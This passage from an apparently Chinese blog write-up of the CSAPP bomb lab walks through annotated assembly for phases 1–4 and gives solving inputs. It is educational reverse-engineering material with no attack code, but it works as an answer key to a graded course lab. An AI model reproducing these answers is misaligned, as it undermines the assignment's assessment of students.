函数调用时的压栈操作</span><br>   <span class="hljs-number">0x0000000000400ee0</span> &lt;+<span class="hljs-number">0</span>&gt;:     sub    $<span class="hljs-number">0x8</span>,%rsp<br>   <span class="hljs-comment">// 将0x402400这个地址放入esi寄存器</span><br>   <span class="hljs-comment">// 作为strings_not_equal的一个参数</span><br>   <span class="hljs-number">0x0000000000400ee4</span> &lt;+<span class="hljs-number">4</span>&gt;:     mov    $<span class="hljs-number">0x402400</span>,%esi<br>   <span class="hljs-number">0x0000000000400ee9</span> &lt;+<span class="hljs-number">9</span>&gt;:     callq  <span class="hljs-number">0x401338</span> &lt;strings_not_equal&gt;<br>   <span class="hljs-comment">// 将eax和eax寄存器进行按位与操作，并把结果放入标志寄存器</span><br>   <span class="hljs-comment">// eax是上面那个函数的返回值，如果eax为0，说明这两个字符是相同的</span><br>   <span class="hljs-number">0x0000000000400eee</span> &lt;+<span class="hljs-number">14</span>&gt;:    test   %eax,%eax<br>   <span class="hljs-comment">// 如果零标志位为1，则je成功运行，即躲过explode_bomb</span><br>   <span class="hljs-comment">// 也就是说零标志位如果是0，代表eax不是0，那么就会爆炸</span><br>   <span class="hljs-number">0x0000000000400ef0</span> &lt;+<span class="hljs-number">16</span>&gt;:    je     <span class="hljs-number">0x400ef7</span> &lt;phase_1+<span class="hljs-number">23</span>&gt;<br>   <span class="hljs-comment">// 爆炸</span><br>   <span class="hljs-number">0x0000000000400ef2</span> &lt;+<span class="hljs-number">18</span>&gt;:    callq  <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x0000000000400ef7</span> &lt;+<span class="hljs-number">23</span>&gt;:    add    $<span class="hljs-number">0x8</span>,%rsp<br>   <span class="hljs-number">0x0000000000400efb</span> &lt;+<span class="hljs-number">27</span>&gt;:    retq<br>End of assembler dump.<br></code></pre></td></tr></table></figure></li></ol><h1 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h1><p>反汇编代码如下<br>这个phase的大意是通过sccanf读取我们输入的6个数字，如果能够满足是1 2 4 8 16 32的话，那就可以通过。<br>结合着汇编代码去看，应该不难理解这个phase的意思。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400</span>efc &lt;phase_2&gt;:<br>  <span class="hljs-number">400</span>efc:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-number">400</span>efd:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">400</span>efe:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">28</span>          sub    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">400f</span>02:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e6             mov    %rsp,%rsi<br>  <span class="hljs-number">400f</span>05:e8 <span class="hljs-number">52</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt;<br>  <span class="hljs-number">400f</span>0a:<span class="hljs-number">83</span> <span class="hljs-number">3</span>c <span class="hljs-number">24</span> <span class="hljs-number">01</span>          cmpl   $<span class="hljs-number">0x1</span>,(%rsp) <span class="hljs-comment">// 栈指针指向的内存的值应该是1</span><br>  <span class="hljs-number">400f</span>0e:<span class="hljs-number">74</span> <span class="hljs-number">20</span>                je     <span class="hljs-number">400f</span>30 &lt;phase_2+<span class="hljs-number">0x34</span>&gt;<br>  <span class="hljs-number">400f</span>10:e8 <span class="hljs-number">25</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>15:eb <span class="hljs-number">19</span>                jmp    <span class="hljs-number">400f</span>30 &lt;phase_2+<span class="hljs-number">0x34</span>&gt;<br>  <span class="hljs-number">400f</span>17:<span class="hljs-number">8b</span> <span class="hljs-number">43</span> fc             mov    <span class="hljs-number">-0x4</span>(%rbx),%eax <span class="hljs-comment">// 将rbx-4的位置的内存值给到eax</span><br>  <span class="hljs-number">400f</span>1a:<span class="hljs-number">01</span> c0                add    %eax,%eax <span class="hljs-comment">// eax乘2</span><br>  <span class="hljs-number">400f</span>1c:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx) <span class="hljs-comment">// 即eax乘2后，要等于rbx指向的值，eax实际上是rbx下面的一个值</span><br>  <span class="hljs-number">400f</span>1e:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400f</span>25 &lt;phase_2+<span class="hljs-number">0x29</span>&gt;<br>  <span class="hljs-number">400f</span>20:e8 <span class="hljs-number">15</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>25:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c3 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rbx <span class="hljs-comment">// 再给rbx+4</span><br>  <span class="hljs-number">400f</span>29:<span class="hljs-number">48</span> <span class="hljs-number">39</span> eb             cmp    %rbp,%rbx<br>  <span class="hljs-number">400f</span>2c:<span class="hljs-number">75</span> e9                jne    <span class="hljs-number">400f</span>17 &lt;phase_2+<span class="hljs-number">0x1b</span>&gt; <span class="hljs-comment">// 重复</span><br>  <span class="hljs-number">400f</span>2e:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">400f</span>3c &lt;phase_2+<span class="hljs-number">0x40</span>&gt; <span class="hljs-comment">//结束当前程序</span><br>  <span class="hljs-number">400f</span>30:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">04</span>       lea    <span class="hljs-number">0x4</span>(%rsp),%rbx <span class="hljs-comment">// 栈顶指针+4，给到rbx</span><br>  <span class="hljs-number">400f</span>35:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">6</span>c <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0x18</span>(%rsp),%rbp <span class="hljs-comment">// 栈顶指针+24，给到rbp，即栈底指针</span><br>  <span class="hljs-number">400f</span>3a:eb db                jmp    <span class="hljs-number">400f</span>17 &lt;phase_2+<span class="hljs-number">0x1b</span>&gt;<br>  <span class="hljs-number">400f</span>3c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">28</span>          add    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">400f</span>40:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">400f</span>41:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-number">400f</span>42:c3                   retq   <br></code></pre></td></tr></table></figure><p>但是有个问题就是，我们输入的应该是正序还是倒序的？这个需要结合read_six_numbers来看了。</p><ol><li>这个函数其实关键是调用了sscanf函数，解析我们输入的字符串</li><li>而sccanf的参数为<code>int sscanf(const char *str, const char *format, ...)</code>，其中后面的省略号就是通过str解析出来的结果，可能有多个，在这里，就是6个数字。</li><li>可以发现，这里将0x4025c3放入了esi，即作为sscanf的第二个参数，那么说明这个地址存放的东西就是解析的format，通过打印这个地址的值可以发现就是”%d %d %d %d %d %d”，说明除了str和format，我们还需要传递六个参数。</li><li>可以发现，第一个参数rdi，这里没有显式地设置，因为这个rdi从phase_2函数开始就没有变过，一直都是我们输入的字符串。</li><li>read_six_numbers在调用sscanf之前的那么多行，其实就是在传递后面的六个参数，也就是第3个到第8个参数。</li><li>通过前几行就可以发现，第1个值被放在了rsi处，而rsi其实就是phase_2的栈顶位置，也就是说第一个被解析出来的值放在栈底，也就是1。因此我们的字符串应该是从1开始增长，而不是从32开始逆序<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">000000000040145</span>c &lt;read_six_numbers&gt;:<br>  <span class="hljs-number">40145</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">401460</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f2             mov    %rsi,%rdx <span class="hljs-comment">// 第3个参数，也是被解析的第一个值</span><br>  <span class="hljs-number">401463</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">04</span>          lea    <span class="hljs-number">0x4</span>(%rsi),%rcx <span class="hljs-comment">// 第4个参数，也是被解析的第二个值</span><br>  <span class="hljs-number">401467</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">14</span>          lea    <span class="hljs-number">0x14</span>(%rsi),%rax<br>  <span class="hljs-number">40146b</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       mov    %rax,<span class="hljs-number">0x8</span>(%rsp)<br>  <span class="hljs-number">401470</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">10</span>          lea    <span class="hljs-number">0x10</span>(%rsi),%rax<br>  <span class="hljs-number">401474</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>          mov    %rax,(%rsp)<br>  <span class="hljs-number">401478</span>:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">0</span>c          lea    <span class="hljs-number">0xc</span>(%rsi),%r9<br>  <span class="hljs-number">40147</span>c:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">08</span>          lea    <span class="hljs-number">0x8</span>(%rsi),%r8<br>  <span class="hljs-number">401480</span>:be c3 <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $,%esi<br>  <span class="hljs-number">401485</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">40148</span>a:e8 <span class="hljs-number">61</span> f7 ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">40148f</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%eax<br>  <span class="hljs-number">401492</span>:<span class="hljs-number">7f</span> <span class="hljs-number">05</span>                jg     <span class="hljs-number">401499</span> &lt;read_six_numbers+<span class="hljs-number">0x3d</span>&gt;<br>  <span class="hljs-number">401494</span>:e8 a1 ff ff ff       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401499</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">40149</span>d:c3                   retq   <br></code></pre></td></tr></table></figure></li></ol><h1 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h1><p>这个phase会让你输入两个数字</p><ul><li>第一个数字是介于0-6之间的数，小于7即可</li><li>第二个数字根据第一个数字，通过switch指令进行跳转<br>一开始做的时候还没看懂那个switch的跳转指令。通过gdb调试不断往下走才确定了我输入的6对应的是哪个位置。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400f</span>43 &lt;phase_3&gt;:<br>  <span class="hljs-number">400f</span>43:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp <span class="hljs-comment">// 减小栈指针，挪出24字节的空间</span><br>  <span class="hljs-number">400f</span>47:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0xc</span>(%rsp),%rcx <span class="hljs-comment">// 栈指针+12 给rcx</span><br>  <span class="hljs-number">400f</span>4c:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0x8</span>(%rsp),%rdx <span class="hljs-comment">// 栈指针+8 给rdx</span><br>  <span class="hljs-number">400f</span>51:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x4025cf</span>,%esi <span class="hljs-comment">// %d %d，sscanf的参数</span><br>  <span class="hljs-number">400f</span>56:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">400f</span>5b:e8 <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">400f</span>60:<span class="hljs-number">83</span> f8 <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// 匹配成功的数目要大于1，即大于等于2，应该是2</span><br>  <span class="hljs-number">400f</span>63:<span class="hljs-number">7f</span> <span class="hljs-number">05</span>                jg     <span class="hljs-number">400f</span>6a &lt;phase_3+<span class="hljs-number">0x27</span>&gt;<br>  <span class="hljs-number">400f</span>65:e8 d0 <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>6a:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0x7</span>,<span class="hljs-number">0x8</span>(%rsp) <br>  <span class="hljs-number">400f</span>6f:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400f</span>ad &lt;phase_3+<span class="hljs-number">0x6a</span>&gt; <span class="hljs-comment">// 7如果大于rsp+8指向的值，则直接爆炸</span><br>  <span class="hljs-number">400f</span>71:<span class="hljs-number">8b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rsp),%eax <span class="hljs-comment">// rsp+8指向的值给eax</span><br>  <span class="hljs-number">400f</span>75:ff <span class="hljs-number">24</span> c5 <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0x402470</span>(,%rax,<span class="hljs-number">8</span>) <span class="hljs-comment">// 间接寻址0x402470+8*rax，其实这里就是个switch操作，根据你输入的第一个数字是0-6，给你传送到下面对应的mov</span><br>  <span class="hljs-number">400f</span>7c:b8 cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xcf</span>,%eax <span class="hljs-comment">// 将eax置为0xcf，即11001111 15+64+128=207</span><br>  <span class="hljs-number">400f</span>81:eb <span class="hljs-number">3b</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>83:b8 c3 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x2c3</span>,%eax<br>  <span class="hljs-number">400f</span>88:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>8a:b8 <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x100</span>,%eax<br>  <span class="hljs-number">400f</span>8f:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>91:b8 <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x185</span>,%eax<br>  <span class="hljs-number">400f</span>96:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>98:b8 ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xce</span>,%eax<br>  <span class="hljs-number">400f</span>9d:eb <span class="hljs-number">1f</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>9f:b8 aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x2aa</span>,%eax<br>  <span class="hljs-number">400f</span>a4:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>a6:b8 <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x147</span>,%eax<br>  <span class="hljs-number">400f</span>ab:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>ad:e8 <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>b2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">400f</span>b7:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>b9:b8 <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x137</span>,%eax<br>  <span class="hljs-number">400f</span>be:<span class="hljs-number">3b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0xc</span>(%rsp),%eax <span class="hljs-comment">// 比较eax是否等于rsp+12指向的值</span><br>  <span class="hljs-number">400f</span>c2:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400f</span>c9 &lt;phase_3+<span class="hljs-number">0x86</span>&gt; <span class="hljs-comment">// 等于的话，直接退出程序</span><br>  <span class="hljs-number">400f</span>c4:e8 <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 不等于的话，就爆炸</span><br>  <span class="hljs-number">400f</span>c9:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">400f</span>cd:c3                   retq   <br></code></pre></td></tr></table></figure></li></ul><h1 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h1><p>phase_4反汇编的代码如下<br>要求我们两个数字，其中第一个数字要小于等于14，第二个数字必须为0。其中第一个数字要通过func4函数，并且使其返回0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">000000000040100</span>c &lt;phase_4&gt;:<br>  <span class="hljs-number">40100</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp <span class="hljs-comment">// 栈指针下移，挪出24字节的位置</span><br>  <span class="hljs-number">401010</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0xc</span>(%rsp),%rcx <span class="hljs-comment">// 将rcx置为栈顶指针+12</span><br>  <span class="hljs-number">401015</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0x8</span>(%rsp),%rdx <span class="hljs-comment">// 将rdx置为栈顶指针+8</span><br>  <span class="hljs-number">40101</span>a:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x4025cf</span>,%esi <span class="hljs-comment">// </span><br>  <span class="hljs-number">40101f</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">401024</span>:e8 c7 fb ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">401029</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">02</span>             cmp    $<span class="hljs-number">0x2</span>,%eax<br>  <span class="hljs-number">40102</span>c:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401035</span> &lt;phase_4+<span class="hljs-number">0x29</span>&gt; <span class="hljs-comment">// 如果输入参数个数不是两个，直接爆炸</span><br>  <span class="hljs-number">40102</span>e:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">0</span>e       cmpl   $<span class="hljs-number">0xe</span>,<span class="hljs-number">0x8</span>(%rsp) <span class="hljs-comment">// 将14 和 栈顶指针+8指向的值 比较</span><br>  <span class="hljs-number">401033</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">40103</span>a &lt;phase_4+<span class="hljs-number">0x2e</span>&gt; <span class="hljs-comment">// 如果小于等于，则跳过炸弹继续执行</span><br>  <span class="hljs-number">401035</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 如果大于则直接爆炸</span><br>  <span class="hljs-number">40103</span>a:ba <span class="hljs-number">0</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xe</span>,%edx <span class="hljs-comment">// 将edx置为14，func4的第3个参数</span><br>  <span class="hljs-number">40103f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%esi <span class="hljs-comment">// 将esi置为0，func4的第2个参数</span><br>  <span class="hljs-number">401044</span>:<span class="hljs-number">8b</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rsp),%edi <span class="hljs-comment">// 将rsp+8指向的值给edi，func4的第1个参数</span><br>  <span class="hljs-number">401048</span>:e8 <span class="hljs-number">81</span> ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt; <span class="hljs-comment">// 调用一个函数</span><br>  <span class="hljs-number">40104</span>d:<span class="hljs-number">85</span> c0                test   %eax,%eax <span class="hljs-comment">// 如果eax不为0，则直接爆炸</span><br>  <span class="hljs-number">40104f</span>:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401058</span> &lt;phase_4+<span class="hljs-number">0x4c</span>&gt; <span class="hljs-comment">// eax不为0，跳到炸弹那里去</span><br>  <span class="hljs-number">401051</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span>       cmpl   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0xc</span>(%rsp) <span class="hljs-comment">// 比较0和rsp+12指向的值</span><br>  <span class="hljs-number">401056</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">40105</span>d &lt;phase_4+<span class="hljs-number">0x51</span>&gt; <span class="hljs-comment">// 如果rsp+12指向的值就是0，则通过</span><br>  <span class="hljs-number">401058</span>:e8 dd <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">40105</span>d:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">401061</span>:c3                   retq<br></code></pre></td></tr></table></figure><p>func4函数的反汇编的代码</p><ol><li>func4是一个递归程序，这个代码如果要完全弄清楚，非常复杂，有一些大佬将其一步步分析成C语言代码，但是依然很恶心。不过如果只是想要通过，就没那么难。</li><li>首先，func4有3个参数，第一个参数就是我们输入的第一个数字，第二个参数固定为0，第三个参数固定为14</li><li>在func4的第一次跳转之前，ecx一定是7。然后我们用第一个数字和ecx即7比较，如果小于等于7就会跳转。</li><li>跳转之后，又用我们第一个数字和ecx即7进行比较，如果小于等于7，就会直接结束函数，并且返回0</li><li>因此，可以发现，7就是一个答案。并且是最简单的那个，都不会触发递归。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400f</span>ce &lt;func4&gt;:<br>  <span class="hljs-number">400f</span>ce:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">400f</span>d2:<span class="hljs-number">89</span> d0                mov    %edx,%eax <span class="hljs-comment">// eax被置为14</span><br>  <span class="hljs-number">400f</span>d4:<span class="hljs-number">29</span> f0                sub    %esi,%eax <span class="hljs-comment">// eax被置为14</span><br>  <span class="hljs-number">400f</span>d6:<span class="hljs-number">89</span> c1                mov    %eax,%ecx <span class="hljs-comment">// ecx被置为14</span><br>  <span class="hljs-number">400f</span>d8:c1 e9 <span class="hljs-number">1f</span>             shr    $<span class="hljs-number">0x1f</span>,%ecx <span class="hljs-comment">// ecx被置为0</span><br>  <span class="hljs-number">400f</span>db:<span class="hljs-number">01</span> c8                add    %ecx,%eax <span class="hljs-comment">// 